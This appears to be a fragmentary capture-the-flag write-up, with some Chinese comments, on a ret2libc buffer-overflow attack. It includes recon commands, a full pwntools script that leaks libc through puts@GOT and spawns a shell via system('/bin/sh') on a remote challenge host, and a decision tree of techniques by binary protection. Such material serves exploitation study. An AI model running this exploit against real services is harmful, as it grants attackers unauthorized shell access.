

   ```bash
   file vuln          # ELF 64-bit, dynamically linked, not stripped
   checksec vuln      # NX enabled, No PIE, No Canary, Partial RELRO
   strings vuln | grep -i 'flag\|/bin/sh\|system'
   ```
   ```bash
   pwndbg> cyclic 200
   pwndbg> cyclic -l 0x6161616c
   ```
   ```python
   payload  = b'A' * 72
   payload += p64(POP_RDI)
   payload += p64(elf.got['puts'])
   payload += p64(elf.plt['puts'])
   ```
   ```python
   payload  = b'A' * 72
   payload += p64(POP_RDI) + p64(libc_base + libc.search(b'/bin/sh').next())
   payload += p64(libc_base + libc.symbols['system'])
   ```


|------|------|---------|------|


```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./vuln')
libc = ELF('./libc.so.6')

POP_RDI = 0x401243   # ROPgadget --binary vuln | grep "pop rdi"
RET     = 0x40101a   # 用于栈对齐

def exp():
    io = remote('chal.example.com', 31337)
    # io = process('./vuln')

    # Stage 1: leak puts@GOT
    payload  = b'A' * 72
    payload += p64(POP_RDI) + p64(elf.got['puts'])
    payload += p64(elf.plt['puts'])
    payload += p64(elf.symbols['main'])

    io.sendlineafter(b'> ', payload)
    leak = u64(io.recvline().strip().ljust(8, b'\x00'))
    libc.address = leak - libc.symbols['puts']
    log.success(f'libc base = {hex(libc.address)}')

    # Stage 2: system('/bin/sh')
    bin_sh = next(libc.search(b'/bin/sh'))
    payload  = b'A' * 72
    payload += p64(RET)             # 16-byte stack alignment
    payload += p64(POP_RDI) + p64(bin_sh)
    payload += p64(libc.symbols['system'])

    io.sendlineafter(b'> ', payload)
    io.interactive()

if __name__ == '__main__':
    exp()
```


```text
checksec → 看保护
├── 无 NX → shellcode 直接打 (古早做法)
├── NX + 无 PIE → ret2libc 经典
├── NX + PIE + 无 Canary → 先泄漏 PIE 基址 → ret2libc
├── 有 Canary → 先想办法泄漏 Canary（格式化字符串 / off-by-one）
└── Full RELRO + Canary + PIE → 难度大，常见手段：fork 不重 ASLR / __libc_start_main / SROP
```


```text
Stage 1: leak puts@GOT → 算 libc base → 回 main
Stage 2: pop rdi; "/bin/sh"; ret; system
```


- Kali 2026.x / Ubuntu 22.04
